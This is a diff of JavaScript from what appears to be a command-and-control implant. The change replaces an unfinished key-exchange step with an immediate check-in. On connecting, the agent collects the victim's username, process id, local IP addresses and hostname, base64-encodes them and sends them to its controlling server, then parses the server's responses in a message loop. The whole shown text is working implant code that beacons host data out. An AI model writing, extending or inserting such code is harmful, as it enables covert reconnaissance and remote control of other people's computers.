@@ -166,12 +166,14 @@ setInterval(function(){
     });
     
     connection.onopen = function() {
-        console.log('Connection received');
-        // TODO: Add code for creating a key message and then sending the message to the server
+        // Send the checkin data
+        const localAddresses = GetLocalIP();
+        const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses, config.hostname);
+        const envelope = JSON.stringify(checkInMessage, null, 2);
         const meta = {};
-        meta["metatype"] = 1;
-        meta["metadata"] = JSON.stringify({'keyid': ID});
-        const metaenvelope = btoa(JSON.stringify(meta));
+        meta.type = 2;
+        meta.metadata = envelope;
+        const metaenvelope = btoa(JSON.stringify(meta, null, 2));
         connection.send(metaenvelope);
     };
     
@@ -189,31 +191,6 @@ setInterval(function(){
         const message = JSON.parse(atob(e.data));
         
         switch (message["metatype"]) {
-            case 1 : {
-                // Encryption not implemented
-                const keyexchangedata = message["metadata"];
-                
-                // 2 - Key Exchange Response from the server
-                if (keyexchangedata["stage"] === 1) {
-                    const decodedkey = base64StringToDataArray(keyexchangedata["key"]);
-                    // TODO: Implement RSA decryption
-                }
-
-                if (keyexchangedata["stage"] === 2) {
-                    // Send the checkin data
-                    const localAddresses = GetLocalIP();
-
-                    const checkInMessage = CreateCallbackCheckInMessage(config.username, config.UUID, config.pid, localAddresses, config.hostname);
-                    const envelope = JSON.stringify(checkInMessage, null, 2);
-                    const meta = {};
-                    meta.type = 2;
-                    meta.metadata = envelope;
-                    const metaenvelope = btoa(JSON.stringify(meta, null, 2));
-                    out.push(metaenvelope);
-                }
-
-                break;
-            }
             case 2 : {
                 // response to callback check in
                 const checkindata = message["metadata"];
